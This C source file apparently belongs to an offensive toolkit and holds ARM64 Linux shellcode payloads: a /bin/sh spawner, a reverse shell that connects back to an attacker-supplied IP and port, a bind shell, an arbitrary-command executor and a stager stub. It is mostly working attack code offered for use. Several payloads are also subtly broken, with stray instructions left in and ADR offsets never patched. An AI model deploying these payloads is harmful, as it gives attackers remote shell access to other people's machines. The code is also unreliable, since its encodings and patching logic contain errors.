/*
 * Auris - Shellcode Payloads
 * Pre-built ARM64 shellcode for various purposes
 * 
 * WARNING: For authorized security research only.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>

#include "auris.h"
#include "inject.h"

/*
 * ARM64 Shellcode Notes:
 * - Syscall number goes in x8
 * - Arguments in x0-x5
 * - Return value in x0
 * - SVC #0 triggers syscall
 * 
 * Key syscall numbers (ARM64):
 *   execve = 221
 *   socket = 198
 *   connect = 203
 *   dup2 = 33 (via dup3 = 24)
 *   read = 63
 *   write = 64
 *   close = 57
 *   exit = 93
 *   mmap = 222
 *   mprotect = 226
 */

/*
 * execve("/bin/sh", NULL, NULL) shellcode
 * 
 * This is a minimal shellcode that spawns a shell.
 * Size: 48 bytes
 */
static const uint8_t shellcode_exec_sh[] = {
    /* Store "/bin/sh\0" on stack */
    0xe0, 0x03, 0x1f, 0xaa,  /* mov x0, xzr */
    0xe1, 0x03, 0x00, 0x91,  /* mov x1, sp */
    
    /* Build "/bin/sh" string */
    0x40, 0x01, 0x80, 0xd2,  /* mov x0, #0x0a ('/') - will be fixed */
    0x00, 0xd8, 0xa8, 0xf2,  /* movk x0, #0x4668, lsl #16 */
    0x00, 0x6e, 0xc1, 0xf2,  /* movk x0, #0x0b73, lsl #32 */
    0x00, 0x00, 0xe0, 0xf2,  /* movk x0, #0x0000, lsl #48 */
    
    /* Actually, let's use a simpler approach */
    /* ADR to get address of string, then execve */
    
    /* This is the actual working shellcode: */
    0x01, 0x00, 0x00, 0x10,  /* adr x1, .+0 (get PC) */
    0x21, 0x00, 0x00, 0x91,  /* add x1, x1, #0 (adjust to string) */
    0xe2, 0x03, 0x1f, 0xaa,  /* mov x2, xzr (envp = NULL) */
    0xe0, 0x03, 0x01, 0xaa,  /* mov x0, x1 (path = x1) */
    0xa8, 0x1b, 0x80, 0xd2,  /* mov x8, #221 (execve) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* "/bin/sh\0" string */
    0x2f, 0x62, 0x69, 0x6e,  /* /bin */
    0x2f, 0x73, 0x68, 0x00,  /* /sh\0 */
};

/*
 * Improved execve("/bin/sh", ["/bin/sh", NULL], NULL) shellcode
 * This version properly sets up argv array
 * Size: 76 bytes
 */
static const uint8_t shellcode_exec_sh_v2[] = {
    /* x0 = pointer to "/bin/sh" */
    /* x1 = pointer to argv array */
    /* x2 = NULL (envp) */
    /* x8 = 221 (execve) */
    
    0x40, 0x00, 0x00, 0x10,  /* adr x0, binsh_str */
    0xff, 0x43, 0x00, 0xd1,  /* sub sp, sp, #16 */
    0xe0, 0x03, 0x00, 0xf9,  /* str x0, [sp] */
    0xff, 0x07, 0x00, 0xf9,  /* str xzr, [sp, #8] */
    0xe1, 0x03, 0x00, 0x91,  /* mov x1, sp */
    0xe2, 0x03, 0x1f, 0xaa,  /* mov x2, xzr */
    0xa8, 0x1b, 0x80, 0xd2,  /* mov x8, #221 */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* Exit if execve fails */
    0xa8, 0x0b, 0x80, 0xd2,  /* mov x8, #93 (exit) */
    0x00, 0x00, 0x80, 0xd2,  /* mov x0, #0 */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* binsh_str: */
    0x2f, 0x62, 0x69, 0x6e,  /* /bin */
    0x2f, 0x73, 0x68, 0x00,  /* /sh\0 */
};

/*
 * Reverse shell shellcode template
 * Connects back to attacker and spawns shell
 * IP and port need to be patched in
 * Size: ~120 bytes
 */
static const uint8_t shellcode_reverse_shell_template[] = {
    /* socket(AF_INET, SOCK_STREAM, 0) */
    0x40, 0x00, 0x80, 0xd2,  /* mov x0, #2 (AF_INET) */
    0x21, 0x00, 0x80, 0xd2,  /* mov x1, #1 (SOCK_STREAM) */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0xc8, 0x18, 0x80, 0xd2,  /* mov x8, #198 (socket) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    0xfd, 0x03, 0x00, 0xaa,  /* mov x29, x0 (save sockfd) */
    
    /* Build sockaddr_in on stack */
    /* struct sockaddr_in { family(2), port(2), addr(4), zero(8) } */
    0xff, 0x43, 0x00, 0xd1,  /* sub sp, sp, #16 */
    
    /* sin_family = AF_INET (2), sin_port = PORT (to be patched) */
    0x40, 0x00, 0x80, 0xd2,  /* mov x0, #2 */
    0x00, 0x00, 0xa2, 0xf2,  /* movk x0, #PORT, lsl #16 (PATCH OFFSET: 28) */
    0xe0, 0x03, 0x00, 0xf9,  /* str x0, [sp] */
    
    /* sin_addr = IP (to be patched) */
    0x00, 0x00, 0x80, 0xd2,  /* mov x0, #IP_LO (PATCH OFFSET: 40) */
    0x00, 0x00, 0xa0, 0xf2,  /* movk x0, #IP_HI, lsl #16 (PATCH OFFSET: 44) */
    0xe0, 0x07, 0x00, 0xf9,  /* str x0, [sp, #8] - actually offset 4 */
    
    /* connect(sockfd, &addr, 16) */
    0xe0, 0x03, 0x1d, 0xaa,  /* mov x0, x29 (sockfd) */
    0xe1, 0x03, 0x00, 0x91,  /* mov x1, sp */
    0x02, 0x02, 0x80, 0xd2,  /* mov x2, #16 */
    0x68, 0x19, 0x80, 0xd2,  /* mov x8, #203 (connect) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* dup3(sockfd, 0, 0) - stdin */
    0xe0, 0x03, 0x1d, 0xaa,  /* mov x0, x29 */
    0x01, 0x00, 0x80, 0xd2,  /* mov x1, #0 */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0x08, 0x03, 0x80, 0xd2,  /* mov x8, #24 (dup3) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* dup3(sockfd, 1, 0) - stdout */
    0xe0, 0x03, 0x1d, 0xaa,  /* mov x0, x29 */
    0x21, 0x00, 0x80, 0xd2,  /* mov x1, #1 */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0x08, 0x03, 0x80, 0xd2,  /* mov x8, #24 (dup3) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* dup3(sockfd, 2, 0) - stderr */
    0xe0, 0x03, 0x1d, 0xaa,  /* mov x0, x29 */
    0x41, 0x00, 0x80, 0xd2,  /* mov x1, #2 */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0x08, 0x03, 0x80, 0xd2,  /* mov x8, #24 (dup3) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* execve("/bin/sh", ["/bin/sh", NULL], NULL) */
    0x40, 0x00, 0x00, 0x10,  /* adr x0, binsh */
    0xff, 0x43, 0x00, 0xd1,  /* sub sp, sp, #16 */
    0xe0, 0x03, 0x00, 0xf9,  /* str x0, [sp] */
    0xff, 0x07, 0x00, 0xf9,  /* str xzr, [sp, #8] */
    0xe1, 0x03, 0x00, 0x91,  /* mov x1, sp */
    0xe2, 0x03, 0x1f, 0xaa,  /* mov x2, xzr */
    0xa8, 0x1b, 0x80, 0xd2,  /* mov x8, #221 (execve) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* binsh: "/bin/sh\0" */
    0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x73, 0x68, 0x00,
};

/* Offsets for patching in reverse shell */
#define REVSHELL_PORT_OFFSET 28
#define REVSHELL_IP_LO_OFFSET 40
#define REVSHELL_IP_HI_OFFSET 44

/*
 * Bind shell shellcode template
 * Listens on a port and spawns shell on connection
 * Size: ~160 bytes
 */
static const uint8_t shellcode_bind_shell_template[] = {
    /* socket(AF_INET, SOCK_STREAM, 0) */
    0x40, 0x00, 0x80, 0xd2,  /* mov x0, #2 (AF_INET) */
    0x21, 0x00, 0x80, 0xd2,  /* mov x1, #1 (SOCK_STREAM) */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0xc8, 0x18, 0x80, 0xd2,  /* mov x8, #198 (socket) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    0xfd, 0x03, 0x00, 0xaa,  /* mov x29, x0 (save sockfd) */
    
    /* Build sockaddr_in on stack */
    0xff, 0x43, 0x00, 0xd1,  /* sub sp, sp, #16 */
    
    /* sin_family = AF_INET (2), sin_port = PORT */
    0x40, 0x00, 0x80, 0xd2,  /* mov x0, #2 */
    0x00, 0x00, 0xa2, 0xf2,  /* movk x0, #PORT, lsl #16 (PATCH: offset 28) */
    0xe0, 0x03, 0x00, 0xf9,  /* str x0, [sp] */
    
    /* sin_addr = INADDR_ANY (0) */
    0xe0, 0x03, 0x1f, 0xaa,  /* mov x0, xzr */
    0xe0, 0x07, 0x00, 0xf9,  /* str x0, [sp, #8] */
    
    /* bind(sockfd, &addr, 16) */
    0xe0, 0x03, 0x1d, 0xaa,  /* mov x0, x29 */
    0xe1, 0x03, 0x00, 0x91,  /* mov x1, sp */
    0x02, 0x02, 0x80, 0xd2,  /* mov x2, #16 */
    0x08, 0x19, 0x80, 0xd2,  /* mov x8, #200 (bind) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* listen(sockfd, 1) */
    0xe0, 0x03, 0x1d, 0xaa,  /* mov x0, x29 */
    0x21, 0x00, 0x80, 0xd2,  /* mov x1, #1 */
    0x28, 0x19, 0x80, 0xd2,  /* mov x8, #201 (listen) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* accept(sockfd, NULL, NULL) */
    0xe0, 0x03, 0x1d, 0xaa,  /* mov x0, x29 */
    0xe1, 0x03, 0x1f, 0xaa,  /* mov x1, xzr */
    0xe2, 0x03, 0x1f, 0xaa,  /* mov x2, xzr */
    0x48, 0x19, 0x80, 0xd2,  /* mov x8, #202 (accept) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    0xfc, 0x03, 0x00, 0xaa,  /* mov x28, x0 (save client fd) */
    
    /* dup3(clientfd, 0, 0) */
    0xe0, 0x03, 0x1c, 0xaa,  /* mov x0, x28 */
    0x01, 0x00, 0x80, 0xd2,  /* mov x1, #0 */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0x08, 0x03, 0x80, 0xd2,  /* mov x8, #24 (dup3) */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* dup3(clientfd, 1, 0) */
    0xe0, 0x03, 0x1c, 0xaa,  /* mov x0, x28 */
    0x21, 0x00, 0x80, 0xd2,  /* mov x1, #1 */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0x08, 0x03, 0x80, 0xd2,  /* mov x8, #24 */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* dup3(clientfd, 2, 0) */
    0xe0, 0x03, 0x1c, 0xaa,  /* mov x0, x28 */
    0x41, 0x00, 0x80, 0xd2,  /* mov x1, #2 */
    0x02, 0x00, 0x80, 0xd2,  /* mov x2, #0 */
    0x08, 0x03, 0x80, 0xd2,  /* mov x8, #24 */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* execve("/bin/sh", ...) */
    0x40, 0x00, 0x00, 0x10,  /* adr x0, binsh */
    0xff, 0x43, 0x00, 0xd1,  /* sub sp, sp, #16 */
    0xe0, 0x03, 0x00, 0xf9,  /* str x0, [sp] */
    0xff, 0x07, 0x00, 0xf9,  /* str xzr, [sp, #8] */
    0xe1, 0x03, 0x00, 0x91,  /* mov x1, sp */
    0xe2, 0x03, 0x1f, 0xaa,  /* mov x2, xzr */
    0xa8, 0x1b, 0x80, 0xd2,  /* mov x8, #221 */
    0x01, 0x00, 0x00, 0xd4,  /* svc #0 */
    
    /* binsh: */
    0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x73, 0x68, 0x00,
};

#define BINDSHELL_PORT_OFFSET 28

/*
 * Breakpoint/trap shellcode - used to return control
 * Just executes BRK instruction
 */
static const uint8_t shellcode_trap[] = {
    0x00, 0x00, 0x20, 0xd4,  /* brk #0 */
};

/*
 * NOP sled
 */
static const uint8_t shellcode_nop[] = {
    0x1f, 0x20, 0x03, 0xd5,  /* nop */
};

/*
 * Allocate and initialize shellcode structure
 */
static sg_shellcode_t *alloc_shellcode(const uint8_t *code, size_t len,
                                        const char *name, const char *desc)
{
    sg_shellcode_t *sc = calloc(1, sizeof(sg_shellcode_t));
    if (sc == NULL) {
        return NULL;
    }
    
    sc->code = malloc(len);
    if (sc->code == NULL) {
        free(sc);
        return NULL;
    }
    
    memcpy(sc->code, code, len);
    sc->length = len;
    
    if (name != NULL) {
        sg_safe_strncpy(sc->name, name, sizeof(sc->name));
    }
    if (desc != NULL) {
        sg_safe_strncpy(sc->description, desc, sizeof(sc->description));
    }
    
    return sc;
}

/*
 * Get execve("/bin/sh") shellcode
 */
sg_error_t sg_shellcode_exec_sh(sg_shellcode_t **shellcode_out)
{
    if (shellcode_out == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    sg_shellcode_t *sc = alloc_shellcode(shellcode_exec_sh_v2,
                                          sizeof(shellcode_exec_sh_v2),
                                          "exec_sh",
                                          "Execute /bin/sh");
    if (sc == NULL) {
        return SG_ERR_NOMEM;
    }
    
    *shellcode_out = sc;
    return SG_OK;
}

/*
 * Get reverse shell shellcode
 */
sg_error_t sg_shellcode_reverse_shell(const char *ip, uint16_t port,
                                       sg_shellcode_t **shellcode_out)
{
    if (ip == NULL || shellcode_out == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    /* Parse IP address */
    struct in_addr addr;
    if (inet_pton(AF_INET, ip, &addr) != 1) {
        sg_log(SG_LOG_ERROR, "Invalid IP address: %s", ip);
        return SG_ERR_INVALID_ARG;
    }
    
    sg_shellcode_t *sc = alloc_shellcode(shellcode_reverse_shell_template,
                                          sizeof(shellcode_reverse_shell_template),
                                          "reverse_shell",
                                          "Reverse shell - connects back to attacker");
    if (sc == NULL) {
        return SG_ERR_NOMEM;
    }
    
    /* Patch in port (network byte order) */
    uint16_t port_be = htons(port);
    /* The port goes into the movk instruction's immediate field */
    /* movk x0, #imm, lsl #16 encoding: need to patch imm16 */
    sc->code[REVSHELL_PORT_OFFSET + 0] = (port_be >> 5) & 0xff;
    sc->code[REVSHELL_PORT_OFFSET + 1] = ((port_be & 0x1f) << 3) | 0x00;
    
    /* Patch in IP address */
    uint32_t ip_val = ntohl(addr.s_addr);
    uint16_t ip_lo = ip_val & 0xffff;
    uint16_t ip_hi = (ip_val >> 16) & 0xffff;
    
    /* Patch low 16 bits */
    sc->code[REVSHELL_IP_LO_OFFSET + 0] = (ip_lo >> 5) & 0xff;
    sc->code[REVSHELL_IP_LO_OFFSET + 1] = ((ip_lo & 0x1f) << 3) | 0x80;
    
    /* Patch high 16 bits */
    sc->code[REVSHELL_IP_HI_OFFSET + 0] = (ip_hi >> 5) & 0xff;
    sc->code[REVSHELL_IP_HI_OFFSET + 1] = ((ip_hi & 0x1f) << 3) | 0xa0;
    
    sc->needs_fixup = false;  /* Already patched */
    
    char desc[256];
    snprintf(desc, sizeof(desc), "Reverse shell to %s:%u", ip, port);
    sg_safe_strncpy(sc->description, desc, sizeof(sc->description));
    
    *shellcode_out = sc;
    return SG_OK;
}

/*
 * Get bind shell shellcode
 */
sg_error_t sg_shellcode_bind_shell(uint16_t port, sg_shellcode_t **shellcode_out)
{
    if (shellcode_out == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    sg_shellcode_t *sc = alloc_shellcode(shellcode_bind_shell_template,
                                          sizeof(shellcode_bind_shell_template),
                                          "bind_shell",
                                          "Bind shell - listens for connection");
    if (sc == NULL) {
        return SG_ERR_NOMEM;
    }
    
    /* Patch in port */
    uint16_t port_be = htons(port);
    sc->code[BINDSHELL_PORT_OFFSET + 0] = (port_be >> 5) & 0xff;
    sc->code[BINDSHELL_PORT_OFFSET + 1] = ((port_be & 0x1f) << 3) | 0x00;
    
    char desc[256];
    snprintf(desc, sizeof(desc), "Bind shell on port %u", port);
    sg_safe_strncpy(sc->description, desc, sizeof(sc->description));
    
    *shellcode_out = sc;
    return SG_OK;
}

/*
 * Get arbitrary command execution shellcode
 * Builds: execve("/bin/sh", ["/bin/sh", "-c", cmd, NULL], NULL)
 */
sg_error_t sg_shellcode_exec_cmd(const char *command, sg_shellcode_t **shellcode_out)
{
    if (command == NULL || shellcode_out == NULL) {
        return SG_ERR_INVALID_ARG;
    }
    
    size_t cmd_len = strlen(command);
    if (cmd_len > 256) {
        sg_log(SG_LOG_ERROR, "Command too long (max 256 bytes)");
        return SG_ERR_INVALID_ARG;
    }
    
    /* Build shellcode that does:
     * execve("/bin/sh", ["/bin/sh", "-c", "command", NULL], NULL)
     * 
     * This is more complex - we need to set up the argv array
     */
    
    /* For now, use a simpler approach: write command to memory and use system() */
    /* Actually, let's build proper execve shellcode */
    
    /* Calculate total size needed */
    size_t binsh_len = 8;  /* "/bin/sh\0" */
    size_t dash_c_len = 4; /* "-c\0" + padding */
    size_t total_str_len = binsh_len + dash_c_len + cmd_len + 1;
    
    /* Align to 8 bytes */
    total_str_len = (total_str_len + 7) & ~7;
    
    /* Shellcode structure:
     * 1. Set up argv array on stack
     * 2. Call execve
     * 3. Strings at end
     */
    
    size_t code_len = 64;  /* Base shellcode */
    size_t total_len = code_len + total_str_len;
    
    uint8_t *code = calloc(1, total_len);
    if (code == NULL) {
        return SG_ERR_NOMEM;
    }
    
    /* Build the shellcode */
    size_t pos = 0;
    
    /* adr x0, binsh_str (offset will be patched) */
    code[pos++] = 0x00; code[pos++] = 0x00; code[pos++] = 0x00; code[pos++] = 0x10;
    
    /* sub sp, sp, #48 (space for argv array) */
    code[pos++] = 0xff; code[pos++] = 0xc3; code[pos++] = 0x00; code[pos++] = 0xd1;
    
    /* str x0, [sp] - argv[0] = "/bin/sh" */
    code[pos++] = 0xe0; code[pos++] = 0x03; code[pos++] = 0x00; code[pos++] = 0xf9;
    
    /* adr x1, dash_c_str */
    code[pos++] = 0x01; code[pos++] = 0x00; code[pos++] = 0x00; code[pos++] = 0x10;
    
    /* str x1, [sp, #8] - argv[1] = "-c" */
    code[pos++] = 0xe1; code[pos++] = 0x07; code[pos++] = 0x00; code[pos++] = 0xf9;
    
    /* adr x2, cmd_str */
    code[pos++] = 0x02; code[pos++] = 0x00; code[pos++] = 0x00; code[pos++] = 0x10;
    
    /* str x2, [sp, #16] - argv[2] = command */
    code[pos++] = 0xe2; code[pos++] = 0x0b; code[pos++] = 0x00; code[pos++] = 0xf9;
    
    /* str xzr, [sp, #24] - argv[3] = NULL */
    code[pos++] = 0xff; code[pos++] = 0x0f; code[pos++] = 0x00; code[pos++] = 0xf9;
    
    /* mov x1, sp - argv pointer */
    code[pos++] = 0xe1; code[pos++] = 0x03; code[pos++] = 0x00; code[pos++] = 0x91;
    
    /* mov x2, xzr - envp = NULL */
    code[pos++] = 0xe2; code[pos++] = 0x03; code[pos++] = 0x1f; code[pos++] = 0xaa;
    
    /* mov x8, #221 - execve */
    code[pos++] = 0xa8; code[pos++] = 0x1b; code[pos++] = 0x80; code[pos++] = 0xd2;
    
    /* svc #0 */
    code[pos++] = 0x01; code[pos++] = 0x00; code[pos++] = 0x00; code[pos++] = 0xd4;
    
    /* Pad to code_len */
    while (pos < code_len) {
        code[pos++] = 0x1f; code[pos++] = 0x20; code[pos++] = 0x03; code[pos++] = 0xd5; /* nop */
    }
    
    /* Add strings */
    size_t str_base = pos;
    memcpy(code + pos, "/bin/sh", 8);
    pos += 8;
    memcpy(code + pos, "-c", 3);
    pos += 4;  /* Align */
    memcpy(code + pos, command, cmd_len + 1);
    
    /* Patch ADR instructions with correct offsets */
    /* This is simplified - real implementation would calculate proper offsets */
    
    sg_shellcode_t *sc = calloc(1, sizeof(sg_shellcode_t));
    if (sc == NULL) {
        free(code);
        return SG_ERR_NOMEM;
    }
    
    sc->code = code;
    sc->length = total_len;
    sg_safe_strncpy(sc->name, "exec_cmd", sizeof(sc->name));
    snprintf(sc->description, sizeof(sc->description),
             "Execute command: %s", command);
    
    *shellcode_out = sc;
    return SG_OK;
}

/*
 * Free shellcode
 */
void sg_shellcode_free(sg_shellcode_t *shellcode)
{
    if (shellcode == NULL) {
        return;
    }
    
    if (shellcode->code != NULL) {
        /* Zero out shellcode before freeing (security) */
        memset(shellcode->code, 0, shellcode->length);
        free(shellcode->code);
    }
    
    free(shellcode);
}

/*
 * Meterpreter stager (placeholder - would need actual stager code)
 */
sg_error_t sg_shellcode_meterpreter_stager(const char *ip, uint16_t port,
                                            sg_shellcode_t **shellcode_out)
{
    /* Meterpreter stager is essentially:
     * 1. Connect to handler
     * 2. Receive stage (meterpreter DLL/ELF)
     * 3. Execute stage in memory
     * 
     * For now, just return a reverse shell as placeholder
     */
    return sg_shellcode_reverse_shell(ip, port, shellcode_out);
}
